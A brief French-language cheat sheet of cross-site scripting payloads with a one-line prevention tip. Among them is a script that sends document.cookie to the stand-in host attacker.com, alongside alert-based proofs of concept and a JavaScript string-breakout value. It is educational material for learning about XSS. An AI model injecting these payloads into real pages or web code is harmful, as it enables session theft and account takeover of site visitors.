# XSS (Cross-Site Scripting) Examples

Les injections XSS permettent d'exécuter du JavaScript malveillant dans le navigateur de la victime.

```html
<!-- XSS basique -->
<script>alert('XSS')</script>

<!-- XSS via attribut HTML -->
<img src=x onerror="alert(1)" />

<!-- XSS blind via code JavaScript -->
<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
```

```javascript
// XSS dans un contexte JS
var data = '...'; // payload
console.log('User data: ' + data); // If data contient: ');alert(1);('
```

> **Prévention** : Échappez/encodez les sorties, utilisez CSP et sanitize inputs.
